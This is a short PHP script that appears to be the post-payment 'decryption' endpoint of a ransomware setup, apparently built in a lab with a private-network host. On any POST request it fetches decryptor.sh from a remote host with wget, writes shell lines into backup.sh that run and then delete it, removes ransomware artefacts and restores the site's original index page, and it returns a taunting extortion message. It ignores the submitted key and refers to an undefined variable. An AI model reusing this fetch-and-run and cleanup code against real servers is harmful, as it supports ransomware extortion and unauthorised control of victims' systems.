<?php
// Allow only POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(['error' => 'Only POST requests are allowed.']);
    exit;
}


// Get the POST data
$input_key = $_POST['decryptionKey'] ?? null;


// Call the necessary scripts to decrypt and delete all the files and restore the home page
system("wget 192.168.1.3:9001/decryptor.sh");
system('echo "chmod +x decryptor.sh \n./decryptor.sh \nrm decryptor.sh" >> backup.sh');
system('echo "rm ransomware.sh \nrm -r target_directory \nrm lab.c \nrm exploit.phar \nrm dec.php \nrm index.html \nrm pamela.jpg \ncd ../../.. \nrm index.html \nmv oldindex.php index.php \ncd content/media/file" >> backup.sh');


// Return the output
echo json_encode([
    'success' => true,
    'command' => $command,
    'message' => "It was a pleasure doing business with you!\n See you soon!"
]);
?>

